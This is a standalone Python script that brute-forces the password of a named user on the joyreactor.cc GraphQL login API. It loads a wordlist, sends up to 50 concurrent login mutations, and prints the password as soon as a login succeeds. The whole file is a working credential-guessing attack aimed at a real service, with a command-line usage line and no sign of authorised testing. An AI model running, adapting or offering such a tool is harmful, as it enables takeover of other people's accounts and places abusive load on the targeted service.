#!/usr/bin/env python3
import asyncio
import aiohttp
import sys
import time

URL = "https://api.joyreactor.cc/graphql"
QUERY = """
mutation Login($name: String!, $password: String!) {
  login(name: $name, password: $password) {
    me { id username }
  }
}
"""

found = asyncio.Event()
result = {"password": None}
stats = {"tried": 0, "start": 0}


async def try_login(session, username, password, semaphore):
    if found.is_set():
        return

    payload = {"query": QUERY, "variables": {"name": username, "password": password}}
    async with semaphore:
        try:
            async with session.post(URL, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as r:
                data = await r.json()
                stats["tried"] += 1

                if "errors" not in data:
                    result["password"] = password
                    found.set()
                    print(f"\n[+] SUCCESS! password={password!r}")
                    print(f"[+] Response: {data}")
                elif stats["tried"] % 500 == 0:
                    elapsed = time.time() - stats["start"]
                    rps = stats["tried"] / elapsed
                    print(f"[-] {stats['tried']} tried | {rps:.1f} req/s | last: {password!r}")
        except Exception as e:
            print(f"[!] Error on {password!r}: {e}")


async def bruteforce(username, wordlist_path, workers=50):
    with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Target:   {username}")
    print(f"[*] Wordlist: {len(passwords):,} passwords")
    print(f"[*] Workers:  {workers} concurrent requests\n")

    semaphore = asyncio.Semaphore(workers)
    stats["start"] = time.time()

    connector = aiohttp.TCPConnector(limit=workers)
    headers = {"Content-Type": "application/json"}

    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        tasks = [
            asyncio.create_task(try_login(session, username, pwd, semaphore))
            for pwd in passwords
        ]
        await asyncio.gather(*tasks)

    elapsed = time.time() - stats["start"]
    if result["password"]:
        print(f"\n[+] Found in {elapsed:.1f}s after {stats['tried']:,} attempts")
    else:
        print(f"\n[-] Not found. Tried {stats['tried']:,} passwords in {elapsed:.1f}s")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <username> <wordlist> [workers=50]")
        sys.exit(1)

    workers = int(sys.argv[3]) if len(sys.argv) > 3 else 50
    asyncio.run(bruteforce(sys.argv[1], sys.argv[2], workers))
